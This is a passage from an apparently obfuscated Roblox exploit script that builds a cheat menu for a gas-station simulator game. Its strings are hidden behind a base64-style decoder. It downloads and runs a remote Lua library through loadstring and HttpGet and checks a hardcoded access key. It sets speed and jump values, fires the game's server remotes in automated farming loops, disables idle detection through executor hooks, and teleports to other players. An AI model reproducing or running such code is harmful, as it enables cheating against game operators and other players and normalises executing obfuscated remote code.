    Options = {IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('SeENzUniVILPAmkUGcCfxhNmUfBwQggbgCoctRszrQHGCLauSgaXKpjU3Bhd24gQXJlYQ=='), IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('XeuLYaxKRzMmdxcDokQJIWnQlXVcYlxYpvkQAwVUAaKUFbFzDlrnaJYRm9yZXN0IEFyZWE='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('vDRtFryRvfjVEpjlymRViPvDwaPKdsThhiDYajYqqyuYPLxpGlRkaCaRmxvd2VyIEFyZWE='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('jrQkwSOsIRcuuqdwEHRHjXOPHjCZyikbFwamnnWgvZkQVZaWoRIFKgaU3dhbXAgQXJlYQ=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('vceQebfEWvyCPqrRMJuOxfTUJCuUhvPamLdXiNkrqMBcWJdLaiOGsAmU25vdyBBcmVh'),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('HMbVsuwIqmgEErISCRtkGaqWkRFMZlqCfJsLbUDtRJTqHQvhXOrNJGFU2FuZCBBcmVh'),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('QILgOkAbywTwrGiLqunNYLtkTdQnALFmvTIIXyjpTyWfagzoEttXsAZRGVhdGggQXJlYQ=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('cQrVtuLxtDJthngJcjHmNDZZMzKQskAtyCLKYciJKruhzVpnyPGkGsQQmVhY2ggQXJlYQ=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('mSYPghvwSmlskNuBxJLZIdlJheqFlPpBVKmbJnLpiXEDAqlbSZtMycjTWluZXMgQXJlYQ=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('jiWNgDLujdcLtGYwritimFZsSkvTJyTXLcttyeWWsWZQzRichqTqYFLQ2xvdWQgQXJlYQ=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('zwjuQBHDFFSQgwAliURuChSUyagcjcisQMTRpSpDtQpqPADYbaybYYtQ29yYWwgQXJlYQ=='),IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('liZrkLkSqGzZVmHtItwbvBNFsflgswcfEiCyYUELkxXLJZzTeJQQmaIRGFya2hlYXJ0IEFyZWE=')};
    ItemSelecting = true; 
    DefaultItemSelected = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('rTTCmPccMrFOaWdNrQbPhrstDRuWKFPuIqWiDsISyQUuQezLUfhBuGuU3Bhd24gQXJlYQ=='); 
})

local Eggs = Eggs:CreateDropdown({
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('bEIhYaWJafnrBDEtbKzcXYBEWjykudLtOcUbrQrtzpGSSymLbellObYU2VsZWN0IEVnZw==');
    Callback = function(Value) 
        SelectEgg = Value
    end;
    Options = Eggs_Table; 
    ItemSelecting = true; 
    DefaultItemSelected = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('GosQpPcWhYfdpRWctYhdneNiQxdhGmArcrlVrFTADbFESvMTaruZCVhU3RhcnRlcg=='); 
})

--> SLIDER <--
Misc:CreateSlider({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ZMZeUVMaljtfSSFTlaFtvgnOujEbezeBLzSoTMpTPKzPYsalpsobFaoV2Fsa1NwZWVk'); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('QDJuvRDYzXHfgNYIvuVgxVVmPwZxtqHXFkZoaGeriGnlGQyTDFBKgkdd3M='); 
    Min = 16; 
    Max = 250; 
    AllowOutOfRange = true;
    Digits = 2;
    Default = 16; 
    Callback = function(v)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
    end;
})

Misc:CreateSlider({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('tcrFtXbZojkZNwRxclfmhrZLuEurBXDSlKmmYTypGeTxOVKlcGtrZVdSnVtcFBvd2Vy'); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('xUBSiHtmIcjYyfDlFVmTeZVjYjlBfKhGydFXfPXcbJAUCekqVewyUiianA='); 
    Min = 50; 
    Max = 350; 
    AllowOutOfRange = true;
    Digits = 2;
    Default = 50; 
    Callback = function(v)
        game.Players.LocalPlayer.Character.Humanoid.JumpHeight = v
    end;
})

Misc:CreateSlider({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('smPCYZSKHviSuxEFKnXpfCvTbqisZZRmzYUBQnLhyRSNZnTizVRolcQRk9W'); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('EZORRBtVLDVbsRmXCxCqCyEnlZzQYotwwEkdYYeLdlCTHcFhZSMisVpRk9W'); 
    Min = 70; 
    Max = 120; 
    AllowOutOfRange = true;
    Digits = 2;
    Default = 70; 
    Callback = function(v)
        game.Workspace.CurrentCamera.FieldOfView = v
    end;
})

elseif game.PlaceId == 9359839118 then
--> LOADING THE GUI <--
local Atlas = loadstring(game:HttpGet(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('VMCPhndtRUTlHzlNTCTcRhYOIuREYfnHFotJffhFekXcMlUomHlMMrWaHR0cHM6Ly9yZDJnbG9yeS5jb20vQXRsYXMubHVh')))()
local UI = Atlas.new({
        Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('vKrxDGaowexrMWXjDjRdLwHfZIjGAODjfiWzipWdiumxsMNLUztszglRGVtaXNlSHViIHwgR2FzIFN0YXRpb24gU2ltdWxhdG9yIA=='); 
        ConfigFolder = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('vNmtlRdMYdQPCthMVsvLtAQEieecEgPtVXYQhuNIiYtjrfssjZgUutsRGVtaXNlSHVi'); 
        Credit = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('WlUIkbJZHniQbmjFhJyGfjNlhWNHxNCYfilHUYRSdTatdpmweJPtyvQTWFkZSBCeSBwdGgjMDMxNg=='); 
        Color = Color3.fromRGB(255, 255, 255); 
        Bind = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('YZZXgLFpCXKJICCbBBZlYziFPJgCYzcvRMSwHtAQbYaKeOOvLjaNcDhTGVmdENvbnRyb2w='); 
        UseLoader = true; 
        FullName = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('FVQtGiDxHflVDzYUhVuEhdsJpNUByrdNxiQfwGKruFVBAOYLhpNHiqiRGVtaXNlSHVi'); 
        CheckKey = function(inputtedKey) 
            return inputtedKey==IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('LaCOmdobBTJneHiaIjShXAvsQuVYYbLMYdqzPEruwwcDnRmUdFXdhOuRDNtaXNlMG5UMHA=')
        end;
        Discord = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('aexKPAXGxjHMzGMxOliFCmGmkbxAVyLfoBkSZfTizeHqmdAomIvKRpraHR0cHM6Ly9kaXNjb3JkLmdnL2ZRdkh4OE1qS1M=');
    })

--> VALUES <--
getgenv().AutoWindowsValue = nil
getgenv().AutoSolarValue = nil
getgenv().AutoPumpValue = nil
getgenv().AutoStainsValue = nil
getgenv().AutoCashierValue = nil

local busy = false

game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('DKKMJcePuVTesuBwawGfTfJrbiHMOcxSCZIqHVhnGHalPOkGgQIETWYUGxheWVycw==')).LocalPlayer.PlayerGui.GameUI.Stamina.Bar.Amount.Changed:Connect(function(prop)
    if prop == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('FjWwgQSsmLvyLGFQpIwjOKkdtXmpJiYmtBSNQcismgIPwxYJWmnYtgWVGV4dA==') then
        stam = tonumber(
            string.sub(
                game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('jjRsgXzaBzBixQvGLzdyAFnLXGcjQCQVmORatPlstvxYnVlrTUQfsxaUGxheWVycw==')).LocalPlayer.PlayerGui.GameUI.Stamina.Bar.Amount.Text,
                1,
                #game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('qiFxxdvPVsUqnNqarakPOiydsSXCDkJIwqslUQRPgAhanoQwmCVvavfUGxheWVycw==')).LocalPlayer.PlayerGui.GameUI.Stamina.Bar.Amount.Text - 1
            )
        )
        if stam <= 15 then
            UI:Notify({
                Title = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('CpGVeOlzeqeBLDQRPFuVJaDZginGfwWEWrYsviOzVcMPwMHIKKpGkCPRW5lcmd5');
                Content = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('sWqzFfBXfYSohYYXwGFZhRgWiUILqZizzkEHcRgYelUMjLrcEUjqMWjWW91ciBlbmVyZ3kgaXMgYXQg') .. tostring(stam) .. IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('tZcMjrWmLXeMnLvGqEEPgqNmeHyJMlxlZjgakbxRkPCaXyGbqQLpXeaJQ=='),
              })
            end
        end
    end)

    print(stam)
    
    function AutoPump()
        task.spawn(function()
            while getgenv().AutoPumpValue do
            break
                end
                for i, car in pairs(game.Workspace:GetChildren()) do
                    if string.find(car.Name, IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('KAGJwketxqwQISNknnhkMyeJgpCCAuHwVjqoDFDBtKGxBkNYZxfePXEQ2FyXw==')) then
                        if string.find(car.Name, IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('iZDHczncIRWKZANnHXXWTRhKWnHGRAbchCsMGhQrRiTlqJQYvcCcEYaQ2FyX0J1cw==')) then
                            continue
                        end
                        local root = car:FindFirstChild(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ZxGHJxrMpCrcKAuojiMkQylAkIFXcWLPzxScigRFJmsjFQuxArdDjqxUm9vdA=='))
                        if root then
                            local pump = root:FindFirstChild(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('burvxInioTDviaNXMoyROnYgAeKWjgJodPabvKhBEVrJUGrPEFpNudrUHVtcA=='))
                            local lid = car:WaitForChild(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('sJBPncAHaPLZKfwlqGFJGjYQCQTbSoUKUMRRpDswLoeOpIwxHIPHXveTGlk'))
                            local fuel = lid:FindFirstChild(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('WMqfOUIcxkdttZUyFjIGRgJSEWuHOvZKbsdNciurdmqTXgYODXAVCQeUmVmdWVs'))
                            local finishFuel = lid:FindFirstChild(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('FBwYHMcrUFIMfzIcMAtnUwKrzJCcoQVkNKJCcHACyHmLGnNvwPeoXorRmluaXNoRnVlbA=='))
                            if pump and pump.Value ~= nil then
                                local fuelgui = pump.Value:FindFirstChild(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('cEQJUVxokNZjyvxwPtuPmwQxGviNZwGxownSqwFdkbTyohErcwqAbcqU2NyZWVu')).FuelUI
    
                                local fuelneeded = 0
                                if fuel then
                                    local splits = string.split(fuel.ObjectText, IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('CbTzPwDBmNItBDgYXTfEcQZhgELTFUMGMcGOWVlZRAjQCLIVnuPZsccIA=='))
    
                                    fuelneeded = tonumber(string.sub(splits[2], 1, #splits[2] - 1))
                                end
                                local totalFuel = tonumber(string.sub(fuelgui.Storage.Text, 1, #fuelgui.Storage.Text - 1))
                                if fuelneeded > 0 then
                                    print(fuelneeded)
                                end
    
                                if fuel and totalFuel > fuelneeded and totalFuel > 0 and not busy then
                                    busy = true
                                    local args = {
                                        [1] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ZtbIbbFAvwZsuzxlKjNsmDiUagPdYOtnevcKdrenAPKyxcxscfzQdklRnVlbEN1c3RvbWVy'),
                                        [2] = car,
                                        [3] = pump.Value,
                                    }
    
                                    game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('oqXSbSuAyUFmhDPcfxaSbTKKIMZhqGPMaSheSlnKMTlJTeaYBTmmVqAUmVwbGljYXRlZFN0b3JhZ2U=')).Remote:FireServer(unpack(args))
                                    task.wait(1.5)
                                    busy = false
                                end
                                if finishFuel and not busy then
                                    busy = true
                                    local args = {
                                        [1] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('DcmxhLosoqUunQPaEoWvJDOlQyidAZfNUhMuxNvChmtCrUQoufNSiqxRmluaXNoRnVlbA=='),
                                        [2] = car,
                                        [3] = pump.Value,
                                    }
    
                                    game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('vxqvInLPWeZvmCgKoYEetGrNXKMCftcKVCsTXWFqVrKkhERHdgZNsxQUmVwbGljYXRlZFN0b3JhZ2U=')).Remote:FireServer(unpack(args))
                                    task.wait(0.5)
                                    busy = false
                                end
                            end
                        end
                    end
                end
    
            task.wait()
        end)
    end
    
    function AutoSolar()
        task.spawn(function()
            while getgenv().AutoSolarValue do
                if not getgenv().AutoSolarValue or stam <= 15 then
                    break
                end
                for i, panel in pairs(workspace.Solar.Panels:GetChildren()) do
                    local dirt = panel.Dirt
    
                    if dirt.Transparency < 1 and not busy then
                        busy = true
                        local args = {
                            [1] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ieztbWuRUNcnVDaCSUzThxtCgHNwfCYJPvuJNNXDdkrGUUXMHuUODGbQ2xlYW4='),
                            [2] = workspace.Solar.Panels[panel.Name].Stand.CleanPosition.Clean,
                        }
                        game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('iUnVRmxMafPvVBYcOkgqnHGkesSqOkLYYptTLgZikgETfuxIYmXJwjgUmVwbGljYXRlZFN0b3JhZ2U=')).Remote:FireServer(unpack(args))
                        task.wait(1.5)
                        busy = false
                    end
                end
                task.wait()
            end
        end)
    end
    
    function AutoWindows()
        task.spawn(function()
            while getgenv().AutoWindowsValue do
                for i, v in pairs(game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('QaytCGjicVQJuBHXqFAqAkYORvlGrYegZUBPvztDkwKxxkglVhuNfLSV29ya3NwYWNl')).Windows:GetChildren()) do
                    local sand = v:FindFirstChild(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('bopBXcXmrauRilMzDfurtodDHIEnmOvMPjMmJWJddABwDFZJNEDNYSiU2FuZA=='))
    
                    if sand.Transparency < 1 and not busy then
                        busy = true
                        local args = {
                            [1] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('GextHjmAGqbhNghQFZotiGxrBDVYVSrnDJsNrTxcOCXBouYAMiMoyzVQ2xlYW4='),
                            [2] = v.Attachment.Clean,
                        }
    
                        game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('rfEBDzIJcFITeLcGHtJJVTNLTXVtpyHcMzbyrtxkqdejarQOpmUlgrWUmVwbGljYXRlZFN0b3JhZ2U=')).Remote:FireServer(unpack(args))
                        task.wait(0.2)
                        local anims = game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()
                        local count = 5
                        repeat
                            count -= 1
                            anims = game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()
                            task.wait(1)
                        until #anims <= 1 or count <= 0
                        busy = false
                    end
                end
                task.wait()
            end
        end)
    end
    
    function AutoStains()
        task.spawn(function()
            while getgenv().AutoStainsValue do
                if not getgenv().AutoStainsValue and stam <= 15 then
                    break
                end
    
                for i, v in pairs(workspace.Stains:GetChildren()) do
                    if stam <= 15 then
                        break
                    end
                    if not busy and v:FindFirstChild(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('zugmCeIXaHqJgIBWGhZABwGGwNqdYcQSyyFFjhiiYmpeBSNdYJCJvcbQ2xlYW4=')) then
                        busy = true
                        local args = {
                            [1] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('OYmfXnDddWVYAUvgtukNHVvmrIBYisioSxrWzPPYWFrRGqpqZDcucjNQ2xlYW4='),
                            [2] = v.Clean,
                        }
    
                        game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('tgYdtQMnLQyUZszcfXFOzNQARWynXTTlMczTZIIvkPYdzxIxjjgHfDtUmVwbGljYXRlZFN0b3JhZ2U=')).Remote:FireServer(unpack(args))
                        task.wait(0.5)
                        busy = false
                    end
                end
                task.wait()
            end
        end)
    end
    
    function AutoCashier()
        task.spawn(function()
            while getgenv().AutoCashierValue do
                if not getgenv().AutoCashierValue and stam <= 15 then
                    break
                end
    
                for _, cashier in pairs(workspace.Checkouts:GetChildren()) do
                    if #cashier.Items:GetChildren() > 0 and not busy then
                        busy = true
                        for i, v in pairs(cashier.Items:GetChildren()) do
                            local args = {
                                [1] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('YBkEyHfkLfAgzfLmCoNdHKILzKfwwdGrhPJpsbjOuqbEEMKbIGTvQYVU2Nhbkl0ZW0='),
                                [2] = v,
                                [3] = cashier,
                            }
    
                            game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('SqnMFTKPaFkHrlSirwPdoOIVILYwAQHrxPwjBsAtgRHzmbKYvslNHITUmVwbGljYXRlZFN0b3JhZ2U=')).Remote:FireServer(unpack(args))
                            task.wait(.5)
                            busy = false
                        end
                        busy = false
                    end
                end
                task.wait()
            end
        end)
    end
     
    local FarmTab = UI:CreatePage(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('SyYcTHMLrpGBsclqoEBvbKtstJfyDzJldNqPYcukqUqlGcPSLNFpJaLQXV0b0Zhcm0='))
    local TeleportTab = UI:CreatePage(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('xGqyiyEZItBRcCefEpGPGuixGbgTJjALunOFErdbMxscXDsyCldFPAwVGVsZXBvcnQ='))
    local MiscTab = UI:CreatePage(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('jjlUeqaGczPxjpQaNttrbftFXWqicrktqqozpsPAKBDIGzTiRcSKYktTWlzYw=='))

    local AutoFarm = FarmTab:CreateSection(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('gHymbheECGiEoAzJShaTBYEVDwHLOTXYdmAnlahKoaryCfUNEIVmmvtQXV0byBTdHVmZg=='))
    local Teleport = TeleportTab:CreateSection(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('imkmmDGlZTckYSCfgyqKKNkYkifnWiztsQwNHFVDjchMmyqjpXOAxAKVGVsZXBvcnQ='))
    local Misc = MiscTab:CreateSection(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('flDWzSCPheGiuthrSQLxxtxvcEhWtBJNtSulhFTHvbEXDOIobOodLiiTWlzYw=='))
 

    AutoFarm:CreateToggle{ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('BSdAypYcJwRKCNnguChimztyzUDtYeZGvziVRSvPJTNuSiLsobPWMdaQ2xlYW4gV2luZG93cw=='); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('NiWLBVdYYqLhzBPOMHoQCJNwsCvGTfWhGCwLJuZXgzOaricgsvemtTid2lu'); 
    Default = false;
    Callback = function(v) 
        getgenv().AutoWindowsValue = v
        AutoWindows()
    end;
}

AutoFarm:CreateToggle({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('sHiiZYdBtEPnTUZViapZuGYRyDLZuIlHKXxZIGBtCOZJJWlkTZmxOWeQ2xlYW4gRmxvb3I='); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('XzjLjOhBjDZKFrfxxwucDaZUNgJBEWjQgCJtYGRCrhutGHqUMdvuUGDZmxv'); 
    Default = false;
    Callback = function(v) 
        getgenv().AutoStainsValue = v
        AutoStains()
    end;
})

AutoFarm:CreateToggle({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('NxFilspijwzKCKcMmFsWoGSqGTqEmAnjpYEMIeCUxsuIlXJgzQqdMnaQXV0byBDbGVhbiBTb2xhciBQYW5lbHM='); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('KTnOHpkIkoJiYvpDpFCknbDRxZIpdrBMaoneBUXKFTQlUCrWQYeIBfLc29s'); 
    Default = false;
    Callback = function(v) 
        getgenv().AutoSolarValue = v
        AutoSolar()
    end;
})

AutoFarm:CreateToggle({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('kldjHqHstZAwsQbSqNVQxEmoWowbxeFZBBEJJeCBjUZzMKcejFIRWViQXV0byBTY2FuIENoZWNrb3V0IEl0ZW1z'); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('yXqSzydDXoCxwllkuSKMknqWIoYinxjGOdBodoiMLLImpBDNAXkoCIqY2hl'); 
    Default = false;
    Callback = function(v) 
        getgenv().AutoCashierValue = v
        AutoCashier()
    end;
})

AutoFarm:CreateToggle({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('WekWuLMblMKFvfyGTwMpXwDvlySvbWUoNGZGGZjYTvhXnzRzntguqUjQXV0byBSZWZ1ZWwgQ2Fycw=='); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('vuodTvYashGJeIgmkGxnwQRoihJQJZrxcamazraqemGfpWuRdewCcojY2Fy'); 
    Default = false;
    Callback = function(v) 
        getgenv().AutoPumpValue = v
        AutoPump()
    end;
})

AutoFarm:CreateToggle({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('OUONcyTkvtFHBIneXroFEvsODsfVPuSasjJfRgSWVkOIKkXqZTTNIIJQW50aS1BRks='); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('YOugJHgBxVnyxoCQjpjTZPMDqWnJOUkqopXUwTzEPUOyZUmRNPWotjkQUZL'); 
    Default = false;
    Callback = function() 
        local Players = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ablrvhPcAMEPbNBfwFzbxyRZIWbEOYokhhMNEwhTydJkDaJIrwLfsuZUGxheWVycw=='))
            local GC = getconnections or get_signal_cons
            if GC then
                for i, v in pairs(GC(Players.LocalPlayer.Idled)) do
                    if v[IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('KoPfaSwBxEUQeGwyIomOFmkLkVEFITXykNfVNBMXonUAmipYVNjPZLzRGlzYWJsZQ==')] then
                        v[IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('hylWJeNDQxLYwgPuNiIgvHsAFjwYRwPNMxqqtibWzINFotlBNLDbpGKRGlzYWJsZQ==')](v)
                    elseif v[IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('yFxDeWhDLhKbFFbwFTkMdLsqzSXbZXQTLvpjdrPiraayajuFTRJWDvvRGlzY29ubmVjdA==')] then
                        v[IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('OWLGVeMYFIsdfecpHecCDSgyTSRdxVFSXmGxCCOFIpbqrorbRjOxmosRGlzY29ubmVjdA==')](v)
                    else
                        print(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('XyJZJnCETVSFziWTTaNwxAtfohVlLnMXQjRqKsibFEmlYuTxLiSFMaH'))
                    end
                end
            elseif not GC then
                UI:Notify({
                    Title = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('GnMPSseqvzlXENwtWAoqMpnTgqrYRQlvDhpMRwpGMCnEKPAaIEYoTGCRGVtaXNlSHViIHwgRXJyb3I=');
                    Content = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('MjJZQDQnLvrYPKLMxczFOLLHsBxuTCAporucaCEYGwAgpNjngiydmPnWW91ciBleGVjdXRvciBkb2VzIG5vdCBzdXBwb3J0IGdldGNvbm5lY3Rpb25zIA==') .. game.Players.LocalPlayer.Name,
                }
            )
        end
    end
})

local plrs = {}
    local selectedPlr
     
for _, v in next, game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('auGSndPcQFiKCaBKtZBqiKmDjQMOQatFcxXyAKZNDnCqsbHQHxdfHqtUGxheWVycw==')):GetPlayers() do
    if v.Name ~= game.Players.LocalPlayer.Name then
        table.insert(plrs, v.Name)
    end
end

Teleport:CreateDropdown({
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ssYrTYPQgCCUsKvjepTOdqJfpTvDrKAckUqQTkTdpQlUhTWuxxfzmJlU2VsZWN0IFBsYXllcg==');
    Callback = function(x) 
        selectedPlr = x
    end;
    Options = plrs;
    ItemSelecting = true; 
    DefaultItemSelected = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('jOztPPjeyRcGTbKNquOhZLnBkYpMyvFeTaxBTaNWZUbcnqsztGigxBlbmls'); 
    
})

Teleport:CreateButton{
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('CMweEqCCzERVojJjodDbyhZKwmVafLRXYsuiHoQvlbokQeexQwtTRpbVFAgVG8gUGxheWVy'); 
    Callback = function() 
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
        game.Players[selectedPlr].Character.HumanoidRootPart.CFrame
    end
}

Misc:CreateButton({
